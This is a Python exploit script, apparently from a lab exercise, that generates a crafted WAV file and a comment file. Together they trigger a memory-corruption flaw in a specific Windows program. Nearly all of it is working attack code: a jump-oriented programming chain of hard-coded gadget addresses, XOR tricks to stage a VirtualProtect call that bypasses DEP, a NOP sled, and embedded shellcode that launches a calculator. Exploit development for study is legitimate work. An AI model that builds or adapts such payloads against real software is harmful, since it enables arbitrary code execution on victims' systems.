import struct
import os


# UPdate stack value
def update_stack():
    l = [
        # POP EAX ; JMP EDX
        0xFFFFFFFF, 0xFFFFFFFF, 0x00401546,

        # MOV ECX, 0x552a200 # MOV EBX, 0x4a204040, JMP EDX
        0xFFFFFFFF, 0xFFFFFFFF, 0x00401561,

        # XOR ECX, EAX ; MOV EBX, ECX ; JMP EDX
        0xFFFFFFFF, 0xFFFFFFFF, 0x00401573,

        # PUSH ECX ; XOR EAX, EAX ; JMP EDX
        0xFFFFFFFF, 0xFFFFFFFF, 0x00401592,

        # ADD ESP, 4 ; JMP EDX
        0xFFFFFFFF, 0xFFFFFFFF, 0x004015d0

    ]

    return l

# How to run virtual protect with the jop table
# Originally broken out because I thought this was going to require 2 calls to VP()
def virtual_protect():

    # Many of these comments are abbreviations of actual instructions due to length
    jop_gadgets = []

    # POP EAX ; MOV ECX ; XOR ECX ; PUSH ECX ; ADD ESP
    jop_gadgets.extend(update_stack())

    # POP EAX ; MOV ECX ; XOR ECX ; PUSH ECX ; ADD ESP
    jop_gadgets.extend(update_stack())

    # POP EAX ; MOV ECX ; XOR ECX ; PUSH ECX ; ADD ESP
    jop_gadgets.extend(update_stack())

    # POP EAX ; MOV ECX ; XOR ECX ; PUSH ECX ; ADD ESP
    jop_gadgets.extend(update_stack())

    # POP EAX ; MOV ECX ; XOR ECX ; PUSH ECX ; ADD ESP
    jop_gadgets.extend(update_stack())

    # POP EAX ; MOV ECX ; XOR ECX ; PUSH ECX ; ADD ESP
    jop_gadgets.extend(update_stack())


    # POP EAX ; MOV ECX ; XOR ECX ; PUSH ECX ;  REMOVE ADD ESP
    jop_gadgets.extend(update_stack()[:-3])


    # SUB ESP, 8 ; JMP EDX ; With PADDING
    jop_gadgets.extend([0xFFFFFFFF,0xFFFFFFFF,0x004015d5])

    # SUB ESP, 8 ; JMP EDX ; With PADDING
    jop_gadgets.extend([0xFFFFFFFF,0xFFFFFFFF,0x004015d5])


    # SUB ESP, 8 ; JMP EDX ; With PADDING
    jop_gadgets.extend([0xFFFFFFFF,0xFFFFFFFF,0x004015d5])


    # JMP DWORD PTR [EBX]
    jop_gadgets.extend([0xFFFFFFFF,0xFFFFFFFF,0x0041d0a5])

    return jop_gadgets

# Create Jop Chain
def create_jop_chain():
    # initial set up
    jop_gadgets = [
        
        # SUB ESP, 8 ; JMP EDX ; With PADDING
        0xFFFFFFFF,0xFFFFFFFF,0xFFFFFFFF, 0x004015d5,

        # MOV ESP, 0x435500 ; JMP EDX ; With Padding
        0xFFFFFFFF, 0xFFFFFFFF, 0x004016ed,

        # ADD ESP, 0x894 ; MOV EBP, ESP ; JMP EDX ; With PAdding
        0xFFFFFFFF, 0xFFFFFFFF, 0x004015e6,

        # ADD ESP, 0x894 ; MOV EBP, ESP ; JMP EDX ; With PAdding
        0xFFFFFFFF, 0xFFFFFFFF, 0x004015e6,

    ]

    # Virtual Protect > Does a lot of xors 
    # Originally broken out because I thought this was going to require 2 calls to VP()
    jop_gadgets.extend(virtual_protect())

    # REVERSING THE JOP CHAIN BECAUSE SUB NOT ADD!!!!
    jop_gadgets = jop_gadgets[::-1]
    
    return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

# Pops a calculator
def shellcode():
    shell = ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
        "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
        "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
        "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
        "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
        "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
        "\x45\x81\x3e\x43\x72\x65\x61\x75"
        "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
        "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
        "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
        "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
        "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
        "\x6c\x63\x89\xe2\x52\x52\x53\x53"
        "\x53\x53\x53\x53\x52\x53\xff\xd7")

    return shell

# Corrects the formatting for little endian
def fix_addr(val1):
    return struct.pack('<I', val1)


# Format bypass for Wave file, a little hacky
def wave_pass(notes,fname):
    first = "RIFF"
    between = "\x00"*4
    second = "WAVEfmt "
    between2 = "\x00"*20
    third = "data"
    payload = first + between + second + between2 + third + notes 

    with open(fname,"wb") as f:
        f.write(payload)

    print(">> New wave file created")

# Writes payload to comment file
def command_file(payload, fname):
    fname = fname
    payload2 = payload
    with open(fname, "wb") as f:
        f.write(payload2)
    print(">> New comment file created")

# Does calculation with xor to get correct address for pre xor with eax
def address_xor(ad,eax):
    eax = eax*4
    pre = int(eax.encode("hex"),16)
    post = pre^ad
    return fix_addr(post)

# Wave file payload
def wave_payload():
    # Starts at 0x00436028
    start = 0x00436028

    # Location we land on after the second ADD ESP to get to user data
    second = 0x00436628

    # End of user controlled data
    end = 0x00436a18


    j_space = 400


    # Jop addr starts at the end of the job chain which we dynamically calculate based on size
    # It goes at the end because we use SUB EDI and not ADD
    jop_addr = start + j_space + (len(create_jop_chain())-4) # address of jop dispatcher table

    # value between second add esp and the jop addr where out values end 
    between = second - (jop_addr+4)

    # Space between N and the jop we want to jump to 
    wev = "N"*j_space

    # wev += create_jop_chain()
    wev += create_jop_chain()

    # Space between jop chain and where we jump with ESP
    wev += "R"*between

    # Value for ECX
    ecx = 0x552a200

    # Addresses we want to apply to stack for virtual protect
    # XORs with ECX to do the XOR trick on stack
    wev += fix_addr(ecx^0x004015b4) # JMP to PTR [ESP]
    wev += fix_addr(ecx^0x00435000) # Pointer to page to update
    wev += fix_addr(ecx^0x00002000) # DW Size - 0x2000 > (The Decimal 1000 was tricky)
    wev += fix_addr(ecx^0x00000040)
    wev += fix_addr(ecx^0x00433000) # Writable Location
    wev += fix_addr(ecx^0x00436654) # Where the stack will be pointing when we are done
    wev += fix_addr(ecx^0x00427008)  # ptr -> VirtualProtect()

    # Start to setup stack
    wev += "JUNK"*4
    wev += "\x90"*15
    
    # ADD ESP, 0x2bc
    wev += "\x81\xC4\xBC\x02\x00\x00"
    
    # Separate Code From Stack 
    wev += "\x90"*800
    wev += shellcode()


    return wev, jop_addr

# Comment file payload
def comment_payload():
    buff1_size = 408
    eax = "J"
    esp = 0x0018cda9
    trash, jop_table_addr = wave_payload()
    dispatch_gadget = 0x401538
    file2_test = eax*(buff1_size-71) # Covers our J value
    file2_test += address_xor(dispatch_gadget,eax) # XORs appropriately for address
    file2_test += address_xor(jop_table_addr,eax) # XORs appropriately for address
    file2_test += "Z"*63 # Space between ESP overwrite
    file2_test += fix_addr(0x401642)# Gadget to SUB ESP, 0x4f # POP EAX # POP EDX # POP EDI # XOR EDX,EAX # CALL EDX
    return file2_test

# Used to start fresh with each test. Automated execution in lab.
# If program doesn't run then the script had a bug and couldn't write the file.
def clear_files():
    try:
        os.remove("Wave_payload.wav")
        print(">> Old wave file deleted")
    except:
        pass 
    try:
        os.remove("Comment.txt")
        print(">> Old comment file deleted")
    except:
        pass


def main():
    # Delete files to start fresh every time, could also just overwrite.
    clear_files()

    # Wave filename
    param1_wave = "Wave_payload.wav" 

    # Comment filename
    param2_comment = "Comment.txt"

    # Set wave file payload
    file1_wave, trash = wave_payload()
    
    # Set comment file payload
    file2_comment = comment_payload()

    # Write Wave File 
    wave_pass(file1_wave,param1_wave)

    # Write Comment File
    command_file(file2_comment,param2_comment)

if __name__ == "__main__":
    main()    
